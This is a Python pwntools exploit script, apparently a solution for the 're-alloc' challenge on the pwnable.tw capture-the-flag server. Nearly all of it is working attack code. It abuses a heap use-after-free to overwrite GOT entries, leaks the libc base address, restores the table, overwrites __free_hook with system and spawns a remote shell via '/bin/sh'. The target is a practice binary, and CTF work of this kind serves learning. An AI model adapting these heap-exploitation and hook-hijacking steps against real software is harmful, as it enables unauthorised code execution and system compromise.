#!/usr/bin/python3

from pwn import *
import subprocess

def alloc(idx, size, data):
	p.sendlineafter(b'choice: ', b'1')
	p.sendlineafter(b'Index:', str(idx).encode())
	p.sendlineafter(b'Size:', str(size).encode())
	p.sendafter(b'Data:', data)

def realloc(idx, size, data=''):
	p.sendlineafter(b'choice: ', b'2')
	p.sendlineafter(b'Index:', str(idx).encode())
	p.sendlineafter(b'Size:', str(size).encode())
	if size!=0:
		p.sendafter(b'Data:', data)

def free(idx):
	p.sendlineafter(b'choice: ', b'3')
	p.sendlineafter(b'Index:', str(idx).encode())

exe = ELF('./re-alloc_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'

# p = process(exe.path)
p = remote('chall.pwnable.tw', 10106)

########################################################
### Stage 1: Overwrite `atoll@got` and `realloc@got` ###
########################################################
alloc(0, 0x18, b'0'*8)
alloc(1, 0x18, b'1'*8)
free(0)

# If no function print data for us
# Overwrite @got with @plt may be the solution
# Use after free, overwrite forward pointer
realloc(1, 0)
realloc(1, 0x18, p64(exe.got['atoll']))

# Get freed chunk out and extend
alloc(0, 0x18, b'0'*8)
realloc(1, 0x28, b'1'*8)
free(1)

# Overwrite atoll@got and realloc@got
ret = 0x4016d9
alloc(1, 0x18, flat(exe.plt['puts'], 0, ret))

########################################################
### Stage 2: Leak libc address & set everything back ###
########################################################
# Leak libc
p.sendlineafter(b'choice: ', b'1')
p.sendafter(b'Index:', b'12344321')
p.recvuntil(b'12344321')
stdout_addr = u64(p.recvline()[:-1] + b'\x00'*2)
libc.address = stdout_addr - 0x1e5760
log.info("Libc base: " + hex(libc.address))

# Reset atoll@got
p.sendlineafter(b'choice: ', b'2')
p.sendlineafter(b'Index:', b'\x00')
p.sendlineafter(b'Size:', b'123443212344321')
p.sendafter(b'Data:', flat(exe.plt['atoll'] + 6))

payload = flat(
	exe.plt['atoll'] + 6,
	0, exe.plt['realloc'] + 6,
	exe.plt['setvbuf'] + 6, exe.plt['__isoc99_scanf'] + 6,
	0, 0,
	libc.address + 0x1e5760, 0,    # stdout
	libc.address + 0x1e4a00, 0,    # stdin
	libc.address + 0x1e5680, 0,    # stderr
	0, 0,
	)
realloc(1, 0x78, payload)

####################################################
### Stage 3: Overwrite `__free_hook` with system ###
####################################################
alloc(0, 0x78, b'0'*8)
alloc(1, 0x78, b'1'*8)
free(1)

# Use after free, overwrite forward pointer
realloc(0, 0)
realloc(0, 0x78, p64(libc.sym['__free_hook']) + p64(0))

# Get freed chunk out and shrink
alloc(1, 0x78, b'/bin/sh\x00')
realloc(0, 0x18, b'/bin/sh\x00')
free(0)

# Overwrite __free_hook
alloc(0, 0x78, p64(libc.sym['system']))

# Get shell
realloc(1, 0x18, b'/bin/sh\x00')
free(1)

p.interactive()
